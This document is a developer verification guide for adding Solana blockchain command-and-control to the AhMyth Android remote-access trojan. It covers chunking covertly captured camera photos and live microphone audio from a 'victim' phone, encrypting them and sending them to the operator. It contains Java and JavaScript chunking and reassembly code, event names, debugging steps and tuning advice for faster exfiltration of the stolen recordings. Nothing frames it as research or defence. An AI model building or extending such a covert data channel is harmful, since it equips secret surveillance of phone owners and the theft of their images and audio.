# Blockchain Chunking Verification Guide

## Summary

Chunked responses ARE implemented for blockchain C2 mode. Both camera photos and live voice audio should work with chunking. This document helps verify the implementation is working correctly.

## How Chunking Works

### Server Side (main.js)

1. **Polling** (line 1175-1209):
   - Polls blockchain for memos with format `RESPCH:chunkId:part/total:hexData`
   - Buffers chunks in `blockchainChunkBuffers` Map
   - When all parts received, assembles hex data
   - Decrypts assembled data
   - Calls `processBlockchainResponse()`

2. **Dispatch** (line 1327-1360):
   - `dispatchToVictimSocket()` emits data to victim's socket listeners
   - Listeners in LabCtrl.js (camera, liveMic, etc.) receive the data

### Client Side (Android)

The Android client needs to:
1. Split large responses (camera image, audio chunks) into parts
2. Send each part as separate blockchain transaction with memo:
   ```
   RESPCH:<chunkId>:<part>/<total>:<hexData>
   ```
3. Use consistent chunkId for all parts of same response

## Verification Steps

### 1. Check Android Client Chunking Implementation

**Files to verify:**
- `BlockchainResponseSender.java`
- `IOSocketBlockchain.java`
- `CameraManager.java`
- `LiveMicManager.java`

**Look for:**
- Chunk size limits (should be <400 bytes per memo due to Solana memo size limits)
- Proper chunk ID generation (consistent across parts)
- Part numbering (1-indexed: part/total)
- Hex encoding of encrypted data

### 2. Test Camera Capture Over Blockchain

**Expected behavior:**
1. Server sends camera command via blockchain
2. Client captures image
3. Client encrypts image with AES-256-GCM
4. Client splits encrypted data into chunks (<400 bytes each)
5. Client sends chunks as: `RESPCH:abc123:1/5:hex`, `RESPCH:abc123:2/5:hex`, etc.
6. Server reassembles chunks
7. Server decrypts full image
8. Server displays in camera view

**Test:**
```javascript
// In Lab view, with blockchain victim selected:
// 1. Open Camera tab
// 2. Select camera
// 3. Click "Capture Photo"
// 4. Check logs for chunk messages:
//    "[⬇] Chunk 1/N received"
//    "[⬇] Chunk 2/N received"
//    ...
//    "[✓] All N chunks assembled"
```

### 3. Test Live Mic Over Blockchain

**Expected behavior:**
1. Server sends liveMic start command
2. Client streams audio chunks
3. Each audio chunk encrypted and sent as blockchain transaction
4. Server polls, receives chunks, plays audio

**Test:**
```javascript
// In Lab view, with blockchain victim selected:
// 1. Open Live Microphone tab
// 2. Click "Start Stream"
// 3. Check "Audio Chunks" counter increments
// 4. Listen for audio playback
```

## Common Issues & Solutions

### Issue 1: Chunks Not Reassembling

**Symptoms:**
- Logs show chunks received but "All chunks assembled" never appears
- Partial data displayed

**Possible causes:**
- Chunk ID not consistent across parts
- Part numbering incorrect (0-indexed instead of 1-indexed)
- Total count mismatch

**Check:**
```java
// In BlockchainResponseSender.java
String chunkId = generateChunkId(); // Should be same for all parts
for (int i = 0; i < parts.length; i++) {
    String memo = String.format("RESPCH:%s:%d/%d:%s",
        chunkId, i + 1, parts.length, parts[i]); // i+1 for 1-indexed
    sendMemo(memo);
}
```

### Issue 2: Data Too Large for Memo

**Symptoms:**
- Transaction fails with "memo too large"
- Error logs about transaction size

**Solution:**
- Solana memos limited to ~566 bytes
- After encryption overhead, use max 400 bytes per chunk
- Calculate: `chunkSize = 400` bytes hex = 200 bytes binary after encryption

**Check:**
```java
// In BlockchainResponseSender.java
private static final int MAX_CHUNK_SIZE_BYTES = 200; // Binary size
private static final int MAX_CHUNK_SIZE_HEX = MAX_CHUNK_SIZE_BYTES * 2; // 400 hex chars
```

### Issue 3: Chunks Received Out of Order

**Symptoms:**
- Chunks arrive but assembly fails
- Decryption errors

**Solution:**
- The chunking logic handles out-of-order arrival
- Server buffers parts until all received
- Check `blockchainChunkBuffers` Map logic

**Verify:**
```javascript
// In main.js line 1185-1194
let entry = blockchainChunkBuffers.get(chunkId);
if (!entry) {
    entry = { total, parts: new Array(total).fill(null), received: 0 };
}
if (!entry.parts[part - 1]) { // part-1 because parts are 1-indexed
    entry.parts[part - 1] = chunkHex;
    entry.received += 1;
}
```

### Issue 4: Event Name Mismatch

**Symptoms:**
- Chunks assemble successfully
- Data decrypts
- But camera/liveMic handler doesn't fire

**Solution:**
- Event name must match between client and server
- Camera: `x0000ca`
- LiveMic: `x0000mc` or actual event name from CONSTANTS

**Verify:**
```java
// In IOSocketBlockchain.java or BlockchainResponseSender.java
// When sending camera response:
JSONObject response = new JSONObject();
response.put("event", "x0000ca"); // Must match CONSTANTS.orders.camera
response.put("data", cameraData);
```

## Debugging Tools

### Enable Verbose Logging

**In main.js:**
```javascript
// Line 1156-1162: Already logs memos
// Increase logging for chunk assembly:
if (entry.received === entry.total) {
    const assembled = entry.parts.join('');
    console.log(`[DEBUG] Assembled ${total} chunks, hex length: ${assembled.length}`);
    console.log(`[DEBUG] First 100 chars: ${assembled.substring(0, 100)}`);
    blockchainChunkBuffers.delete(chunkId);
    sendBlockchainLog(`[✓] All ${total} chunks assembled for ${chunkId}`);
}
```

**In LabCtrl.js:**
```javascript
// Line 1279: Camera handler
socket.on(camera, (data) => {
    console.log('[DEBUG] Camera handler received:', {
        hasError: !!data.error,
        hasBuffer: !!data.buffer,
        bufferType: typeof data.buffer,
        bufferLength: data.buffer ? data.buffer.length : 0
    });
    // ... rest of handler
});
```

### Monitor Blockchain Transactions

Use Solana Explorer to verify chunks are being sent:
```
https://explorer.solana.com/tx/[SIGNATURE]?cluster=devnet
```

Check memo field for `RESPCH:` format.

## Performance Considerations

### Chunk Size Optimization

**Camera images:**
- Typical JPEG: 50-500 KB
- At 200 bytes per chunk: 250-2500 chunks
- At 15 second polling interval: 1-4 minutes to receive full image

**Recommendation:**
- Reduce image quality on client side to <100 KB
- Or increase chunk size to 300 bytes if blockchain supports

**Live audio:**
- Streaming requires real-time delivery
- Consider reducing audio quality or sample rate
- Use smallest chunk size possible for faster delivery

### Polling Frequency

Current: 15 seconds (line 1612 in main.js)

**For live audio, consider:**
```javascript
// Faster polling for active sessions
const pollingInterval = hasActiveAudioStream ? 5000 : 15000;
```

## Expected Log Output

### Successful Camera Capture:
```
[→] Taking picture with camera ID: 0...
[↻] Polling blockchain channel...
[⬇] Chunk 1/12 received (id: a7f3e9)
[⬇] Chunk 2/12 received (id: a7f3e9)
...
[⬇] Chunk 12/12 received (id: a7f3e9)
[✓] All 12 chunks assembled for a7f3e9
[✓] Decrypted response: event=x0000ca
[✓] Picture captured
[✓] Image received: 85 KB (Base64)
```

### Successful Live Mic Stream:
```
[→] Starting live microphone stream...
[↻] Polling blockchain channel...
[⬇] Response received: event=x0000mc
[✓] Live microphone streaming started
[⬇] Response received: event=x0000mc (audio chunk)
[⬇] Response received: event=x0000mc (audio chunk)
...
```

## Files Modified for Chunking Support

### Server Side:
- ✅ `AhMyth-Server/app/main.js` - Lines 1175-1209 (chunk reassembly)
- ✅ `AhMyth-Server/app/app/assets/js/controllers/LabCtrl.js` - Lines 507-534 (client-side polling)

### Client Side (Need to verify):
- `AhMyth-Client/app/src/main/java/ahmyth/mine/king/ahmyth/BlockchainResponseSender.java`
- `AhMyth-Client/app/src/main/java/ahmyth/mine/king/ahmyth/IOSocketBlockchain.java`
- `AhMyth-Client/app/src/main/java/ahmyth/mine/king/ahmyth/CameraManager.java`
- `AhMyth-Client/app/src/main/java/ahmyth/mine/king/ahmyth/LiveMicManager.java`

## Next Steps

1. **Verify Android client has chunking implementation** in `BlockchainResponseSender.java`
2. **Test camera capture** with blockchain victim
3. **Test live mic** with blockchain victim
4. **Review chunk size limits** (currently should be 200 bytes binary / 400 hex)
5. **Consider polling frequency optimization** for real-time features

## Questions to Answer

- [ ] Does `BlockchainResponseSender.java` exist and implement chunking?
- [ ] What is the current chunk size limit in Android client?
- [ ] Are camera and liveMic using the chunking logic?
- [ ] Is the event name correctly set to `x0000ca` for camera, `x0000mc` for mic?
- [ ] Have you tested with actual blockchain victim?
